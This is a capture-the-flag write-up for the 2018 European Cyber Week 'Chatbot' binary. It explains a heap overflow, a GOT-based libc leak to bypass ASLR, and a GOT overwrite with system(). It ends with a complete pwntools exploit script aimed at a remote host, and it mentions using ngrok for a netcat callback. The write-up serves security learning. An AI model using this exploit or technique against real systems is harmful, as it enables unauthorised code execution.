# [European Cyber Week] - Chatbot


## Find the vulnerability

To begin with, I just played with the binary, trying to find bugs in it... After a few seconds I found this:


![](/lib/images/writeups/2018_ecw/chatbot/segfault1.png) 


Ok, maybe there is something here, let's open IDA :D (I hate it).


![](/lib/images/writeups//2018_ecw/chatbot/vulnerability.png) 


* Framed in red: A few `malloc` declaration.
* Purple highlight: `nickname` variable.
* Green highlight: `chatbot` variable.

According to the previous picture, we can assume that the heap looks like this:


![](/lib/images/writeups//2018_ecw/chatbot/heap_chatbot.png) 


Ok, so we saw that the program crashes when I enter too many bytes, let's see how many it takes:


![](/lib/images/writeups//2018_ecw/chatbot/offset.png) 


* Framed in purple: Generation of the segfault.
* Framed in red: Offset determination.

If we try to overflow 16 bytes after the nickname, we're here in the heap:


![](/lib/images/writeups//2018_ecw/chatbot/overflow1.png) 


## Read everywhere

Now, let's try to display an internal string of the binary as botname!
I decided to take this one:


![](/lib/images/writeups//2018_ecw/chatbot/ida_str_yo.png) 


Poc:


![](/lib/images/writeups//2018_ecw/chatbot/poc_readeverywhere.png) 


## Hypothesis

Ok so now we have something really great. What would happened if I can overwrite a GOT address with the address of the system() function? It would look like this:


![](/lib/images/writeups//2018_ecw/chatbot/hypothesis.png) 


## Exploit

Let's exploit it :)

### Bypass ASLR

I need to find a leak in one the libc functions in order to find the libc base address. Then I'll be able to find the offset between the base address and the system() function.

#### Leak the __libc_start_main address

There is a well-known leak in the `__libc_start_main` function in the GOT. We can extract the adress of this function:


![](/lib/images/writeups//2018_ecw/chatbot/start_main_libc.png) 


#### Calculate Libc base address

You will need to display `/proc/[PID of Chatbot]/maps` to get the libc base address and calculate the offset:

```bash
$ ps -A | grep chat
32576 pts/7    00:00:00 chatbot

$ cat /proc/32576/maps
[...]
f7dda000-f7f87000 r-xp 00000000 fd:00 4456457                            /lib32/libc-2.23.so
f7f87000-f7f88000 ---p 001ad000 fd:00 4456457                            /lib32/libc-2.23.so
f7f88000-f7f8a000 r--p 001ad000 fd:00 4456457                            /lib32/libc-2.23.so
f7f8a000-f7f8b000 rw-p 001af000 fd:00 4456457                            /lib32/libc-2.23.so
[...]
```

> Which one of the displayed libc do we need to choose ?

You need to know the system() function address. So your libc base needs to be executable because all the functions in a binary are executable, right ? We can see that only the first one `0xf7dda000` have this permission.


![](/lib/images/writeups//2018_ecw/chatbot/aslr_bypassed.png) 


* Framed in red: In the center, you can see the offset determination. On the right, there is the calculation of the libc base address.
* Framed in yellow: Top right, our new libc base address (because I restarted the chatbot binary, the ASLR randomized the addresses). On the left, you can check our substraction, it looks like it works :)

Another tip, the libc is mapped on memory page, so if after your calculation you have an address that ends with `000` it sounds good. The memory pages are 4Kb long, so `0x1000` in hex.

### System address

We have our libc base address, now we have to find the address of the `system()` function.


![](/lib/images/writeups//2018_ecw/chatbot/systemaddre.png) 


* Framed in red: System address determination.
* Framed in yellow: Little addition.
* Framed in cyan: Check the system address, it looks like it works :)

### Final local exploit

At this point, we have everything we need to exploit the binary and get a shell:


![](/lib/images/writeups//2018_ecw/chatbot/local_exploit.png) 


![](https://media.giphy.com/media/yoJC2GnSClbPOkV0eA/giphy.gif)

## Flag

As we can see, we don't have any return of our function, so I use a little binary called `ngrok` to get a netcat on my laptop (without opening ports).

> https://ngrok.com/

And then, the graal:


![](/lib/images/writeups//2018_ecw/chatbot/flag.png) 

### Complete exploit code:

```python
#!/usr/bin/python2

from pwn import *

#ip = '127.0.0.1'
ip = '54.36.205.82'

addr_yoPython = 0x08049931
addr_libcStartMain = 0x0804C03C
addr_strlengot = 0x0804C038

c = remote(ip, 22000)
print(c.recv(4069))
c.sendline("nickname")
print(c.recv(4096))
#c.interactive()
c.sendline('A'*16+p32(addr_libcStartMain))
c.sendline("help")
rawleak = c.recvuntil("I")
addr_startmain = rawleak.split('\x00')[5][:4] # Had to change my split member from 4 to 5 don't know why
print('Addr start_main: 0x%x' % u32(addr_startmain))
c.recv(4096)
addr_baselibc = u32(addr_startmain) - 0x18540
print('Addr base libc: 0x%x' % addr_baselibc)
addr_system = addr_baselibc + 0x3a940
print('System address: 0x%x' % addr_system)
c.sendline("nickname")
c.recv(4096)
c.sendline('A'*16+p32(addr_strlengot))
c.recv(4096)
c.sendline("botname")
c.recv(4096)
c.sendline(p32(addr_system))
c.interactive()
```
